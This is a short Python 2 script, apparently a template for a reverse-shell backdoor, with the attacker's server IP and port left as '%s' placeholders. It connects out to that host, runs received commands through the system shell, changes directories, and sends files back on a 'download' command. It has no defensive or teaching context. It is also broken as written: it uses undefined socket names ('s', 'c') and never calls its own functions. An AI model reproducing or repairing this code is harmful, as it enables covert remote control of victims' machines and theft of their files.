#!/usr/bin/env python
import os
import socket
import time
import subprocess
import sys
import re
server_ip = '%s'
server_port = %s
server_address = (server_ip, server_port)
def connect():
	global server_address, server_port, server_ip
	while 1:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect(server_address)
			sock.send("[*] Spawning shell...")
			break
		except Exception, err:
			pass
def start_command_line():
	while True:
		data = sock.recv(1024)
		if data:
			if data == 'exit':
				sock.close()
				connect()
			elif data == 'PATH':
				s.send(os.getcwd())
			elif data.startswith("cd "):
				try:
					os.chdir(data[3:])
					sock.send(os.getcwd())
				except:
					c.send("[!] "+data[3:]+" does not exist")
			elif data.startswith("download "):
				filename = data[9:]
				f = open(filename, 'r')
				data = f.readlines()
				c.send(str(data))

			else:
				proc2 = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc2.stdout.read() + proc2.stderr.read()
				sock.send(output)
				if output == '':
					sock.send("[OK]")